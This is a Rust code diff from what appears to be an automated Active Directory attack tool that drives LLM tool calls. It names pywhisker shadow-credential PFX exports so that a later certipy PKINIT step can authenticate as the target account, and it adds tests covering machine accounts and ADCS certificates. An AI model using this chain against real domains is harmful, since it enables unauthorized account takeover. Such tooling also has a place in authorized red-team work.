@@ -305,28 +305,124 @@ pub fn shadow_cred_pfx_password<'a>(args: &'a Value, pfx_path: &str) -> Option<&
     None
 }
 
-/// Build the `--filename` stem `pywhisker` writes `<stem>.pfx`,
-/// `<stem>_cert.pem` and `<stem>_priv.pem` to.
+/// Strip the domain qualifiers an LLM tends to attach to a sAMAccountName.
 ///
-/// Absolute (under the temp dir) so stage two resolves the path regardless of
-/// the working directory the second tool call runs in, prefixed so the export
-/// is recognisable as ours, and timestamped so two writes against the same
-/// principal never overwrite each other's key material.
-fn shadow_cred_pfx_stem(target_sam: &str) -> String {
-    let slug: String = target_sam
+/// `CONTOSO\svc_sql` and `svc_sql@contoso.local` both reduce to `svc_sql`.
+/// `certipy auth` composes its own principal as `{username}@{domain}`, so a
+/// UPN-shaped `-username` yields `svc_sql@contoso.local@contoso.local` and the
+/// KDC answers `KDC_ERR_C_PRINCIPAL_UNKNOWN`.
+fn bare_sam_account_name(raw: &str) -> &str {
+    let trimmed = raw.trim();
+    let after_domain = trimmed
+        .rsplit_once('\\')
+        .or_else(|| trimmed.rsplit_once('/'))
+        .map(|(_, tail)| tail)
+        .unwrap_or(trimmed);
+    after_domain
+        .split_once('@')
+        .map(|(head, _)| head)
+        .unwrap_or(after_domain)
+}
+
+/// Encode a sAMAccountName into the trailing filename segment of a
+/// shadow-credential export stem.
+///
+/// Every character AD permits in a sAMAccountName is kept verbatim, so
+/// [`shadow_cred_pfx_target`] reads the exact account back out. The characters
+/// replaced here — path separators and `:` above all — are ones AD already
+/// forbids, so the lossy branch is reachable only from a malformed argument.
+fn shadow_cred_sam_segment(target_sam: &str) -> String {
+    let bare = bare_sam_account_name(target_sam);
+    let encoded: String = bare
         .chars()
         .map(|c| {
-            if c.is_ascii_alphanumeric() {
-                c.to_ascii_lowercase()
+            if c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '$') {
+                c
             } else {
                 '_'
             }
         })
         .collect();
+    if encoded.is_empty() {
+        "account".to_string()
+    } else {
+        encoded
+    }
+}
+
+/// Recover the account a shadow-credential PFX was minted for from its path.
+///
+/// [`shadow_cred_pfx_stem`] places its uniqueness token before the account and
+/// the account last, so everything after the first `_` that follows the prefix
+/// is the sAMAccountName `pywhisker` wrote `msDS-KeyCredentialLink` onto.
+/// Returns `None` for any path this wrapper did not name.
+pub fn shadow_cred_pfx_target(pfx_path: &str) -> Option<String> {
+    let path = std::path::Path::new(pfx_path);
+    let stem = path.file_stem().and_then(|s| s.to_str())?;
+    let tail = stem.strip_prefix(SHADOW_CRED_PFX_PREFIX)?;
+    let (_token, account) = tail.split_once('_')?;
+    if account.is_empty() {
+        return None;
+    }
+    Some(account.to_string())
+}
+
+/// Resolve the PKINIT identity `certipy auth` must present for `pfx_path`, or
+/// `None` when the certificate carries its own.
+///
+/// `pywhisker` mints a self-signed certificate whose only identity is the
+/// subject CN, and certipy reads identities from the SAN extension alone — so
+/// `get_identities_from_certificate` returns nothing, `certipy auth` warns
+/// `Could not find identity in the provided certificate` and then aborts with
+/// `Username or domain is not specified`. The account is knowable without
+/// parsing anything: the export stem carries it, and the task payload repeats
+/// it. The stem wins because [`build_pywhisker`] writes it from the very
+/// `target_samaccountname` the key credential landed on.
+///
+/// Gated on [`is_shadow_cred_pfx`] so ADCS output is untouched: a `certipy req`
+/// PFX carries a UPN SAN, and supplying a `-username` that disagrees with it
+/// makes certipy stop on an interactive confirmation instead of authenticating.
+pub fn shadow_cred_pfx_identity(args: &Value, pfx_path: &str) -> Option<String> {
+    if !is_shadow_cred_pfx(pfx_path) {
+        return None;
+    }
+    if let Some(from_path) = shadow_cred_pfx_target(pfx_path) {
+        return Some(from_path);
+    }
+    [
+        "target_samaccountname",
+        "target_user",
+        "target_username",
+        "account_name",
+        "username",
+        "upn",
+    ]
+    .into_iter()
+    .filter_map(|key| optional_str(args, key))
+    .map(bare_sam_account_name)
+    .find(|v| !v.is_empty())
+    .map(str::to_string)
+}
+
+/// Build the `--filename` stem `pywhisker` writes `<stem>.pfx`,
+/// `<stem>_cert.pem` and `<stem>_priv.pem` to.
+///
+/// Absolute (under the temp dir) so stage two resolves the path regardless of
+/// the working directory the second tool call runs in, and prefixed so the
+/// export is recognisable as ours. The uniqueness token comes from
+/// [`crate::privesc::unique_run_token`], which no two calls in one operation
+/// can repeat — a bare millisecond timestamp can, because the tool permit lets
+/// two `pywhisker` adds against one principal overlap.
+///
+/// The account goes last and unencoded so [`shadow_cred_pfx_target`] can read
+/// it back: the identity stage two must present is then a property of the path
+/// itself rather than of an argument some later caller has to remember.
+fn shadow_cred_pfx_stem(target_sam: &str) -> String {
     std::env::temp_dir()
         .join(format!(
-            "{SHADOW_CRED_PFX_PREFIX}{slug}_{}",
-            crate::privesc::epoch_millis()
+            "{SHADOW_CRED_PFX_PREFIX}{}_{}",
+            crate::privesc::unique_run_token(),
+            shadow_cred_sam_segment(target_sam)
         ))
         .to_string_lossy()
         .into_owned()
@@ -2008,7 +2104,7 @@ mod tests {
     }
 
     #[test]
-    fn pywhisker_stem_survives_machine_account_and_path_characters() {
+    fn pywhisker_stem_drops_the_domain_and_keeps_the_machine_account_marker() {
         let cmd = super::build_pywhisker(&pywhisker_add_args("CONTOSO\\dc01$")).unwrap();
         let stem = flag_value(cmd.args_for_test(), "--filename").unwrap();
         let name = std::path::Path::new(stem)
@@ -2017,8 +2113,13 @@ mod tests {
             .unwrap();
         assert!(name.starts_with(super::SHADOW_CRED_PFX_PREFIX));
         assert!(
-            !name.contains('\\') && !name.contains('$'),
-            "target decoration must not leak into the path: {name}"
+            !name.contains('\\'),
+            "a path separator must never reach the filename: {name}"
+        );
+        assert!(
+            name.ends_with("_dc01$"),
+            "the trailing '$' is the difference between the machine account and a \
+             user of the same name, and stage two presents whatever this says: {name}"
         );
     }
 
@@ -2032,6 +2133,106 @@ mod tests {
         assert_eq!(
             super::shadow_cred_pfx_password(&json!({}), &pfx),
             Some(super::SHADOW_CRED_PFX_PASSPHRASE)
+        );
+    }
+
+    #[test]
+    fn the_stem_pywhisker_writes_resolves_back_to_the_target_account() {
+        for target in ["svc_sql", "CONTOSO\\dc01$", "bob@contoso.local", "a.b-c_d"] {
+            let cmd = super::build_pywhisker(&pywhisker_add_args(target)).unwrap();
+            let pfx = format!(
+                "{}.pfx",
+                flag_value(cmd.args_for_test(), "--filename").unwrap()
+            );
+            let expected = super::bare_sam_account_name(target);
+            assert_eq!(
+                super::shadow_cred_pfx_target(&pfx).as_deref(),
+                Some(expected),
+                "stage two reads the PKINIT identity out of {pfx}"
+            );
+            assert_eq!(
+                super::shadow_cred_pfx_identity(&json!({}), &pfx).as_deref(),
+                Some(expected),
+                "and needs no argument to do it"
+            );
+        }
+    }
+
+    #[test]
+    fn two_adds_against_one_principal_never_share_a_stem() {
+        let stems: std::collections::HashSet<String> = (0..64)
+            .map(|_| {
+                let cmd = super::build_pywhisker(&pywhisker_add_args("svc_sql")).unwrap();
+                flag_value(cmd.args_for_test(), "--filename")
+                    .expect("add pins a stem")
+                    .to_string()
+            })
+            .collect();
+        assert_eq!(
+            stems.len(),
+            64,
+            "a repeated stem is a repeated PFX: the second write silently replaces \
+             the key material the first one planted"
+        );
+    }
+
+    #[test]
+    fn shadow_cred_pfx_identity_leaves_adcs_certificates_alone() {
+        let args = json!({ "username": "alice", "target_user": "administrator" });
+        for path in [
+            "/tmp/cert_ESC1_1754000000000.pfx",
+            "administrator.pfx",
+            "/tmp/ares_relay_abc/dc01.pfx",
+        ] {
+            assert_eq!(
+                super::shadow_cred_pfx_identity(&args, path),
+                None,
+                "an ADCS certificate carries a UPN SAN; a -username that disagrees \
+                 with it stops certipy on an interactive confirmation: {path}"
+            );
+        }
+    }
+
+    #[test]
+    fn shadow_cred_pfx_identity_falls_back_to_the_arguments() {
+        let unreadable = "/tmp/ares_shadowcred_nostemseparator.pfx";
+        assert_eq!(super::shadow_cred_pfx_target(unreadable), None);
+        assert_eq!(
+            super::shadow_cred_pfx_identity(
+                &json!({ "target_samaccountname": "CONTOSO\\svc_sql" }),
+                unreadable
+            )
+            .as_deref(),
+            Some("svc_sql")
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_identity(
+                &json!({ "target_user": "bob@contoso.local" }),
+                unreadable
+            )
+            .as_deref(),
+            Some("bob"),
+            "certipy composes its own {{username}}@{{domain}}, so a UPN here \
+             produces bob@contoso.local@contoso.local"
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_identity(&json!({}), unreadable),
+            None
+        );
+    }
+
+    #[test]
+    fn shadow_cred_pfx_identity_prefers_the_path_over_a_stale_argument() {
+        let cmd = super::build_pywhisker(&pywhisker_add_args("svc_sql")).unwrap();
+        let pfx = format!(
+            "{}.pfx",
+            flag_value(cmd.args_for_test(), "--filename").unwrap()
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_identity(&json!({ "username": "alice" }), &pfx).as_deref(),
+            Some("svc_sql"),
+            "`username` on a certipy_auth call is the account that ran pywhisker, \
+             not the account the key credential landed on"
         );
     }
 
